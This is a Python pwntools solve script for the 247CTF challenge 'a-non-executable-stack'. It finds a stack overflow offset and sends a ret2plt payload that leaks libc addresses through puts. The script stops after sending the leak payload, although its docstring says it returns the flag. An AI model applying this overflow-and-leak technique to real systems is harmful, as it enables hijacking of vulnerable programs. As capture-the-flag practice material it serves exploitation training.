#!/usr/bin/env python3

'''
WhatTheFuzz's submission for the 247CTF challenge a-non-executable-stack.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
'''

from pwn import *

exe = ELF('non_executable_stack')

context.binary = exe
context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('addr', 4141)

    else:
        io = process([exe.path])

    return io


def get_offset():
    '''Return the offset from where our input is stored on the stack to the
    return address.
    '''

    with process([exe.path]) as io:

        # Send the cyclic pattern.
        io.sendlineafter(b'Enter the secret password:', cyclic(500))
        io.wait()

        # Open the core file.
        core = io.corefile

        # Get the faulting address.
        fault = core.fault_addr
        log.info(f'The faulting address is: {hex(fault)}')

    # Search for the pattern to get the offset.
    offset = cyclic_find(fault)
    return offset


def main():
    '''Return the flag.
    '''

    offset = get_offset()
    log.info(f'The offset is: {offset}')

    # Get the address of puts/strcmp/gets
    puts_plt = exe.plt['puts']
    puts_addr = exe.got['puts']
    strcmp_addr = exe.got['strcmp']
    gets_addr = exe.got['gets']

    log.info(f'The puts@plt address is: {hex(puts_plt)}')
    log.info(f'The puts@got address is: {hex(puts_addr)}')
    log.info(f'The strcmp@got address is: {hex(strcmp_addr)}')
    log.info(f'The gets@got address is: {hex(gets_addr)}')

    # Leak the libc load address of puts/strcmp/gets.
    with conn() as io:

        payload = fit({
            offset: p32(puts_plt),
            offset + exe.bytes: p32(puts_addr),
            offset + exe.bytes * 2: p32(puts_addr),
        })

        payload = io.sendlineafter(b'Enter the secret password:', payload)


if __name__ == '__main__':
    main()
